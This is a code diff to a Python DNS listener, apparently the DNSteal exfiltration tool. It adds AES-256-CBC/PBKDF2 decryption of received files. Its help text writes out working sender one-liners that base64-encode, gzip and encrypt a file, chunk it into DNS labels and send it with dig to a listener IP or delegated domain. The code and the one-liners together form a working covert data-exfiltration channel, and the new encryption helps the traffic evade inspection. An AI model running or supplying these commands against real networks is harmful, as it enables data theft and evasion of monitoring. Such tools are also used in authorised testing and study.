@@ -35,7 +35,9 @@ import base64
 import gzip
 import hashlib
 import os
+import shlex
 import socket
+import subprocess
 import sys
 from collections import OrderedDict
 from datetime import datetime
@@ -74,6 +76,31 @@ def b64_decode_padded(data: bytes) -> bytes:
 
 def b64_encode_no_newline(data: str) -> str:
     return base64.b64encode(data.encode()).decode().rstrip("=")
+
+
+def openssl_decrypt(blob: bytes, password: str) -> Optional[bytes]:
+    """Decrypt AES-256-CBC/PBKDF2 data produced by openssl enc."""
+    try:
+        result = subprocess.run(
+            [
+                "openssl", "enc", "-d", "-aes-256-cbc",
+                "-pbkdf2", "-pass", f"pass:{password}",
+            ],
+            input=blob,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            check=False,
+        )
+    except FileNotFoundError:
+        print(f"{C.R}[!] openssl not found on listener. Install openssl or omit -p.{C.N}")
+        return None
+
+    if result.returncode != 0:
+        err = result.stderr.decode("utf-8", "replace").strip()
+        print(f"{C.R}[!] decrypt failed: {err or 'wrong password or corrupted data'}{C.N}")
+        return None
+
+    return result.stdout
 
 
 def parse_labels(packet: bytes) -> List[bytes]:
@@ -196,7 +223,7 @@ def extract_payload(labels: List[bytes]) -> Tuple[Optional[str], List[bytes]]:
     return filename, chunks
 
 
-def save_received_files(files: Dict[str, List[bytes]], output_dir: Path, decompress: bool) -> None:
+def save_received_files(files: Dict[str, List[bytes]], output_dir: Path, decompress: bool, password: Optional[str]) -> None:
     if not files:
         print(f"{C.Y}[!] no data received{C.N}")
         return
@@ -218,6 +245,13 @@ def save_received_files(files: Dict[str, List[bytes]], output_dir: Path, decompr
         except Exception as e:
             print(f"{C.R}[!] base64 decode failed for {filename!r}: {e}{C.N}")
             continue
+
+        if password:
+            print(f"{C.Y}[>] decrypting {filename!r} with AES-256-CBC/PBKDF2{C.N}")
+            decrypted = openssl_decrypt(blob, password)
+            if decrypted is None:
+                continue
+            blob = decrypted
 
         if decompress:
             try:
@@ -242,13 +276,27 @@ def save_received_files(files: Dict[str, List[bytes]], output_dir: Path, decompr
         print(f"{C.G}[sha256]{sha256}{C.N}\n")
 
 
-def help_text(listen_ip: str, s: int, b: int, domain: str) -> str:
+def help_text(listen_ip: str, s: int, b: int, domain: str, password: Optional[str]) -> str:
     encoded_filename_example = "$(echo -ne \"$f\" | base64 -w0 | tr -d '=')"
     domain = domain.strip(".") or "zz"
 
+    if password:
+        password_prefix = f"export DNSTEAL_PASS={shlex.quote(password)}; "
+        plain_source = "openssl enc -aes-256-cbc -salt -pbkdf2 -pass env:DNSTEAL_PASS -in \"$f\" | base64 -w0"
+        zipped_source = "gzip -c \"$f\" | openssl enc -aes-256-cbc -salt -pbkdf2 -pass env:DNSTEAL_PASS | base64 -w0"
+        password_note = (
+            f"{C.Y}Password encryption enabled with AES-256-CBC/PBKDF2. "
+            f"Sender commands export DNSTEAL_PASS first.{C.N}"
+        )
+    else:
+        password_prefix = ""
+        plain_source = "base64 -w0 \"$f\""
+        zipped_source = "gzip -c \"$f\" | base64 -w0"
+        password_note = ""
+
     plain = (
-        f"f=file.txt; s={s}; b={b}; c=0; "
-        f"for r in $(for i in $(base64 -w0 \"$f\" | sed \"s/.\{{$b\}}/&\\n/g\"); "
+        f"{password_prefix}f=file.txt; s={s}; b={b}; c=0; "
+        f"for r in $(for i in $({plain_source} | sed \"s/.\{{$b\}}/&\\n/g\"); "
         f"do if [[ \"$c\" -lt \"$s\" ]]; then echo -ne \"$i-.\"; c=$(($c+1)); "
         f"else echo -ne \"\\n$i-.\"; c=1; fi; done); "
         f"do dig +noidnin +short +retries=0 +tries=1 "
@@ -256,8 +304,8 @@ def help_text(listen_ip: str, s: int, b: int, domain: str) -> str:
     )
 
     zipped = (
-        f"f=file.txt; s={s}; b={b}; c=0; "
-        f"for r in $(for i in $(gzip -c \"$f\" | base64 -w0 | sed \"s/.\{{$b\}}/&\\n/g\"); "
+        f"{password_prefix}f=file.txt; s={s}; b={b}; c=0; "
+        f"for r in $(for i in $({zipped_source} | sed \"s/.\{{$b\}}/&\\n/g\"); "
         f"do if [[ \"$c\" -lt \"$s\" ]]; then echo -ne \"$i-.\"; c=$(($c+1)); "
         f"else echo -ne \"\\n$i-.\"; c=1; fi; done); "
         f"do dig +noidnin +short +retries=0 +tries=1 "
@@ -267,34 +315,46 @@ def help_text(listen_ip: str, s: int, b: int, domain: str) -> str:
     direct_plain = plain.replace("dig +noidnin", f"dig +noidnin @{listen_ip}")
     direct_zipped = zipped.replace("dig +noidnin", f"dig +noidnin @{listen_ip}")
 
-    return f"""
-{C.W}Sender examples through normal DNS resolution{C.N}
+    sections = [
+        "",
+        f"{C.W}Sender examples through normal DNS resolution{C.N}",
+    ]
 
-{C.G}# Plain file transfer. Listener: no -z{C.N}
-{plain}
+    if password_note:
+        sections.extend(["", password_note])
 
-{C.G}# Gzipped file transfer. Listener: use -z{C.N}
-{zipped}
+    sections.extend([
+        "",
+        f"{C.G}# Plain file transfer. Listener: no -z{C.N}",
+        plain,
+        "",
+        f"{C.G}# Gzipped file transfer. Listener: use -z{C.N}",
+        zipped,
+        "",
+        f"{C.W}Direct-to-listener lab examples{C.N}",
+        "",
+        f"{C.G}# Plain direct query to listener IP{C.N}",
+        direct_plain,
+        "",
+        f"{C.G}# Gzipped direct query to listener IP{C.N}",
+        direct_zipped,
+        "",
+        f"{C.W}Options{C.N}",
+        "  -z        gunzip received data before writing",
+        "  -p PASS   decrypt received data using OpenSSL AES-256-CBC/PBKDF2 before gunzip",
+        "  -v        verbose: print received labels/chunks",
+        f"  -s N      data subdomains per DNS query, default {s}",
+        f"  -b N      bytes per data label, default {b}",
+        "  -f N      accepted for compatibility, default 17",
+        "  -o DIR    output directory, default current directory",
+        "  -d DOMAIN domain suffix for delegated-domain mode, default zz",
+        "",
+        f"{C.Y}Press Ctrl-C to flush received chunks to disk.{C.N}",
+    ])
 
-{C.W}Direct-to-listener lab examples{C.N}
-
-{C.G}# Plain direct query to listener IP{C.N}
-{direct_plain}
-
-{C.G}# Gzipped direct query to listener IP{C.N}
-{direct_zipped}
-
-{C.W}Options{C.N}
-  -z        gunzip received data before writing
-  -v        verbose: print received labels/chunks
-  -s N      data subdomains per DNS query, default {s}
-  -b N      bytes per data label, default {b}
-  -f N      accepted for compatibility, default 17
-  -o DIR    output directory, default current directory
-  -d DOMAIN domain suffix for delegated-domain mode, default zz
-
-{C.Y}Press Ctrl-C to flush received chunks to disk.{C.N}
-"""
+    return "
+".join(sections) + "
+"
 
 
 def main() -> None:
@@ -310,10 +370,11 @@ def main() -> None:
     parser.add_argument("-f", type=int, default=17, help="filename label length, compatibility option")
     parser.add_argument("-o", "--output-dir", default=".", help="directory to write recovered files")
     parser.add_argument("-d", "--domain", default="zz", help="domain suffix for normal DNS mode, for example tunnel.example.com")
+    parser.add_argument("-p", "--password", help="decrypt received data using OpenSSL AES-256-CBC/PBKDF2")
     args = parser.parse_args()
 
     print(BANNER)
-    print(help_text(args.ip, args.s, args.b, args.domain))
+    print(help_text(args.ip, args.s, args.b, args.domain, args.password))
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -330,6 +391,8 @@ def main() -> None:
     print(f"{C.G}[+] listening on {args.ip}:53/udp{C.N}")
     if args.z:
         print(f"{C.Y}[+] gzip mode enabled: received data will be gunzipped before writing{C.N}")
+    if args.password:
+        print(f"{C.Y}[+] password mode enabled: data will be decrypted before optional gunzip{C.N}")
     print()
 
     # filename -> list of base64 data chunks
@@ -389,7 +452,7 @@ def main() -> None:
 
     except KeyboardInterrupt:
         print(f"\n{C.Y}[!] caught Ctrl-C, flushing received data...{C.N}")
-        save_received_files(received, Path(args.output_dir), args.z)
+        save_received_files(received, Path(args.output_dir), args.z, args.password)
     finally:
         sock.close()
         print(f"{C.R}[!] closed listener{C.N}")
